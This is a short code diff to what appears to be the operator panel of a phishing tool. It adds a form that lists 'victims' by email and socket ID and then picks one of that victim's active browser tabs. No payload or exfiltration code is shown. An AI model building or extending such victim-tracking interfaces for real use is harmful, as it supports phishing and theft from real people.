@@ -4,11 +4,21 @@
 <div class="container-fluid">
 		<h2> Phishing </h2>
 		<br>
+		<form action="/phishing" method="GET">
+			<select name="victimSelection" id="victimSelection" class="form-control">
+				<option selected>Select a Victim</option>
+				<% for (var index in victims){ %>
+				<option value="<%=victims[index]['socketID']%>"><%=victims[index]['email']%></option>
+				<% } %>
+			</select>
+			<br>
+			<button type="submit" class="btn btn-default">Choose</button>
+		</form>
 		<form action="/phishing" method="POST">
-			<select name="selection" id="tabSelection" class="form-control">
+			<select name="tabSelection" id="tabSelection" class="form-control">
 				<option selected>Select an Active Tab</option>
 				<% for (var key in rowData){ %>
-				<option value="<%=key%>"><%=rowData[key]%>></option>
+				<option value="<%=key%>"><%=rowData[key]%></option>
 				<% } %>
 			</select>
 			<br>
